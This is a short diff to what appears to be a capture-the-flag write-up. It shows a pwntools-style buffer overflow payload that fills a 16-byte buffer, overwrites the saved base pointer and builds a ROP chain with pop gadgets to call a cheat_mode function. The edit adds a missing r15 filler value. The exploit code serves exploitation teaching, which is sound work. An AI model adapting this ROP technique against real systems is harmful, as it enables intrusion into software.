@@ -137,7 +137,7 @@ r.sendlineafter(b'Select an option:', b'1337')
 ```
 
 Now that we're in enter_cheatcode(), we need to send in the payload. First, we need to reach the saved instruction pointer. As you can see in the source code of enter_cheatcode(), the size of the buffer is 16 bytes. After the buffer is the saved base pointer, then the saved instruction pointer.
-```
+```python
 pay = b'A' * 16   # fill in buffer
 pay += b'B' * 8   # overwrite saved rbp
 ```
@@ -156,7 +156,7 @@ cheat_mode = 0x400736
 pay = b'A' * 16   # fill in buffer
 pay += b'B' * 8   # overwrite saved rbp
 pay += p64(pop_rdi) + p64(0x2323232323232323)
-pay += p64(pop_rsi_r15) + p64(0x4242424242424242)
+pay += p64(pop_rsi_r15) + p64(0x4242424242424242) + p64(0xdeadbeef)
 pay += p64(cheat_mode)
 
 r.sendline(pay)
